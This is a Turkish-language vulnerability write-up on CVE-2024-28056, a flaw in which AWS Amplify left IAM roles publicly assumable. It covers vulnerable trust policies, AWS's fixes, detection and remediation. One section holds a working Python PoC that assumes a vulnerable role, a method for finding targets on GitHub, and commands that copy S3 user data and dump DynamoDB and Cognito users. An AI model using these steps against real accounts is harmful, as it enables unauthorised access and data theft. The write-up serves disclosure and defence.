# AWS Amplify IAM Role Publicly Assumable Exposure (CVE-2024-28056)

> **Keşif Tarihi:** 4 Ocak 2024  
> **AWS Hotfix:** 9 Ocak 2024 (Amplify CLI v12.10.1)  
> **STS Backend Fix:** 8 Nisan 2024  
> **CVE:** CVE-2024-28056  
> **CVSS:** 9.8 (CRITICAL)  
> **Platform:** Amazon Web Services — AWS Amplify  
> **Saldırı Tipi:** IAM Role Takeover → Full AWS Account Compromise  
> **Keşfeden:** Datadog Security Research  
> **Durum:** Tamamen yamalandı — Müşteri denetimi önerilir

---

## Özet

AWS Amplify, Amplify CLI veya Amplify Studio ile oluşturulan projelerde IAM rollerini hatalı yapılandırmaktaydı. Bu hata, projeyle ilişkili IAM rollerinin **dünyadaki herhangi bir AWS hesabı tarafından üstlenilmesine (assumable)** zemin hazırladı.

İki farklı zafiyet varyantı tespit edildi:

- **Varyant 1 (2018-2019 arası):** Amplify CLI'ın belirli sürümleriyle oluşturulan projeler, varsayılan olarak herkese açık IAM trust policy içeriyordu.
- **Varyant 2 (2019-2024 arası):** Authentication bileşeni kaldırıldığında, trust policy koşulları (Conditions) silinirken `"Effect": "Allow"` kalıyordu — bu da rolü herkese açık hale getiriyordu.

---

## AWS Amplify ve Cognito Mimarisi

AWS Amplify, web ve mobil uygulamaların hızlı geliştirilmesi için AWS altyapısını soyutlar. Authentication bileşeni için genellikle şu mimaride IAM rolleri oluşturur:

```
Amplify Projesi
├── Cognito User Pool (Kullanıcı kimlik doğrulama)
├── Cognito Identity Pool (Geçici kimlik bilgisi dağıtımı)
├── authRole (Kimlik doğrulaması yapılmış kullanıcılar için)
└── unauthRole (Anonim kullanıcılar için)
```

Bir role `sts:AssumeRoleWithWebIdentity` ile güvenli erişim sağlamak için trust policy, ilgili Cognito Identity Pool ID'sini **Condition** bloğunda kısıtlamalıdır.

---

## Teknik Detaylar

### Güvenli Trust Policy (Doğru Yapılandırma)

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "cognito-identity.amazonaws.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "cognito-identity.amazonaws.com:aud": "us-east-1:SPECIFIC-POOL-ID"
        },
        "ForAnyValue:StringLike": {
          "cognito-identity.amazonaws.com:amr": "authenticated"
        }
      }
    }
  ]
}
```

### Savunmasız Trust Policy (Hatalı Yapılandırma)

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "cognito-identity.amazonaws.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity"
      // Condition bloğu EKSİK veya SİLİNMİŞ
      // → Herhangi bir Cognito Identity Pool bu rolü üstlenebilir
    }
  ]
}
```

---

## Zafiyet Varyantları

### Varyant 1: Default Trust Policy Hatası (2018-2019)

```
Etkilenen Dönem: Temmuz 2018 — Ağustos 2019
Amplify CLI sürümleri: Bu dönemde oluşturulan projeler

Sorun: Amplify CLI, role trust policy'yi oluştururken
       varsayılan olarak Condition bloğu olmadan
       "Effect":"Allow" içeren konfigürasyon kullandı.

Sonuç: Proje oluşturulduktan itibaren herkes
       bu rolleri AssumeRole ile üstlenebilirdi.
```

### Varyant 2: Authentication Kaldırma Hatası (2019-2024)

```
Etkilenen Dönem: Ağustos 2019 — Ocak 2024

Senaryo: Müşteri, Amplify projesinden authentication bileşenini kaldırır
         (harici Cognito havuzuna geçiş veya başka bir nedenle)

Hata: Kaldırma işlemi sırasında:
    ├── Condition bloğu KALDIRILDI ✓
    └── "Effect":"Allow" KALDI ✗

Sonuç: Condition kaldırıldığında rol herkese açık hale geldi
       Kullanıcılar bu değişikliğin farkında değildi
```

---

## Exploit Adımları

### Önkoşul: Savunmasız Role ARN'ini Bul

Saldırganların farklı yöntemleri vardı:

```bash
# Yöntem 1: Hedef uygulamanın kaynak kodunda veya network trafiğinde ara
# Yöntem 2: GitHub'da açık Amplify config dosyalarını tara
github.com arama: "cognito-identity.amazonaws.com" "Effect Allow" amplify

# Yöntem 3: AWS hesap ID ve beklenen role adını tahmin et
# Amplify rolleri genellikle şu formattadır:
arn:aws:iam::<account_id>:role/<project_name>-<env>-<role_type>
```

### Exploit Çalıştırma

```python
import boto3

def exploit_vulnerable_role(role_arn: str, region: str = "us-east-1"):
    """
    Savunmasız Amplify IAM rolünü üstlen
    CVE-2024-28056 PoC - Yalnızca eğitim amaçlıdır
    """
    # Adım 1: Herhangi bir Cognito Identity Pool oluştur
    cognito = boto3.client('cognito-identity', region_name=region)
    
    pool = cognito.create_identity_pool(
        IdentityPoolName='test-pool',
        AllowUnauthenticatedIdentities=True
    )
    identity_pool_id = pool['IdentityPoolId']
    
    # Adım 2: Anonymous identity al
    identity = cognito.get_id(
        AccountId='<your_account_id>',
        IdentityPoolId=identity_pool_id
    )
    identity_id = identity['IdentityId']
    
    # Adım 3: Token al
    token_response = cognito.get_open_id_token(
        IdentityId=identity_id
    )
    token = token_response['Token']
    
    # Adım 4: Savunmasız rolü üstlen
    sts = boto3.client('sts')
    credentials = sts.assume_role_with_web_identity(
        RoleArn=role_arn,
        RoleSessionName='poc-session',
        WebIdentityToken=token
    )
    
    return credentials['Credentials']

# Başarılı olursa: AccessKeyId, SecretAccessKey, SessionToken döner
```

---

## Etki Analizi

### Ele Geçirilen Rol İzinleri

Savunmasız roller, kaldırılmadan önceki izinlerini korudu:

```
Datadog'un müşteri ortamlarındaki bulgular:
├── AmazonS3FullAccess — S3 bucket'larına tam erişim
├── AmazonDynamoDBFullAccess — veritabanları
├── AmazonCognitoPowerUser — kullanıcı havuzu yönetimi
└── Çeşitli uygulama özel politikalar
```

**Gerçek Dünya Senaryosu:**

```
1. Saldırgan savunmasız role'ü keşfeder ve üstlenir
2. S3 bucket'larını listeler:
   aws s3 ls --profile attacker

3. Hassas veri içeren bucket'lara erişir:
   aws s3 cp s3://company-uploads/user-data/ . --recursive

4. DynamoDB tablolarını okur:
   aws dynamodb scan --table-name Users

5. Cognito user pool'u yönetir:
   aws cognito-idp list-users --user-pool-id <pool-id>
```

---

## AWS'nin Yanıtı

### Acil Düzeltme (Ocak 2024)

```
9 Ocak 2024, 14:33 CST → AWS, Amplify CLI PR oluşturdu
9 Ocak 2024, 22:13 CST → Amplify CLI v12.10.1 yayınlandı
                          → Yeni projeler artık güvenli trust policy ile oluşturuluyor

12 Ocak 2024 → Amplify Studio yaması yayınlandı
17 Ocak 2024 → Datadog, iki detection rule yayınladı
```

### Backend Mitigasyonu (Nisan 2024)

```
8 Nisan 2024 → AWS, STS ve IAM kontrol düzleminde değişiklikler yaptı:
               1. Savunmasız rollerin farklı hesaptan üstlenilmesi ENGELLENDİ
               2. Bu güvenlik açığının yeni örneklerinin oluşturulması ENGELLENDİ
```

---

## Tespit: Organizasyonunuz Etkilenmiş mi?

### Savunmasız Rolleri Tanımlama

```bash
# Amplify rollerini listele:
aws iam list-roles --query \
  "Roles[?contains(RoleName, 'authRole') || contains(RoleName, 'unauthRole')]"

# Trust policy'yi kontrol et — Condition bloğu var mı?
aws iam get-role --role-name <role-name> \
  --query "Role.AssumeRolePolicyDocument" | python3 -m json.tool

# Condition bloğu yoksa → Savunmasız!
# Şu çıktıya dikkat edin:
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Federated": "cognito-identity.amazonaws.com"},
    "Action": "sts:AssumeRoleWithWebIdentity"
    // Condition yok → Herkese açık
  }]
}
```

### CloudTrail İzleme

```bash
# Anormal AssumeRoleWithWebIdentity çağrılarını ara:
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRoleWithWebIdentity \
  --query "Events[?contains(CloudTrailEvent, 'amplify')]" \
  --output json | python3 -m json.tool | grep -E "(sourceIPAddress|userIdentity)"
```

---

## Düzeltme Adımları

### Mevcut Savunmasız Rolleri Düzeltme

```bash
# Belirli Cognito Identity Pool ID'sini kısıtlayan Condition ekleyin:
cat > trust-policy.json << EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "cognito-identity.amazonaws.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "cognito-identity.amazonaws.com:aud": "<your-identity-pool-id>"
        }
      }
    }
  ]
}
EOF

aws iam update-assume-role-policy \
  --role-name <vulnerable-role-name> \
  --policy-document file://trust-policy.json
```

### Amplify CLI Güncellemesi

```bash
npm install -g @aws-amplify/cli@latest
amplify --version  # 12.10.1 veya üzeri olmalı
```

---

## Datadog Detection Rules

Datadog, iki resmi detection rule yayınladı:

```
1. "AWS IAM role should not have permissive trust with the Cognito Identity service"
   → Condition bloğu olmayan Cognito trust'larını yakalar

2. "AWS IAM role should not have permissive trust with the Cognito Identity service and FullAccess"
   → Özellikle yüksek yetkili savunmasız rolleri yakalar
```

---

## Kaynaklar

- [Datadog Security Labs — Detaylı Teknik Analiz](https://securitylabs.datadoghq.com/articles/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/)
- [AWS Güvenlik Bülteni — AWS-2024-003](https://aws.amazon.com/security/security-bulletins/AWS-2024-003/)
- [Hacking The Cloud — Same-Account Exploit](https://hackingthe.cloud/aws/exploitation/Misconfigured_Resource-Based_Policies/exploit_amplify_vulnerability_in_same_account_scenario/)
- [CloudVulnDB](https://www.cloudvulndb.org/aws-amplify-iam-role-publicly-assumable-exposure)
- [NVD — CVE-2024-28056](https://nvd.nist.gov/vuln/detail/CVE-2024-28056)

---

*© 2025 AltHack Security — Gerçek Dünya Siber Güvenlik İstihbaratı*
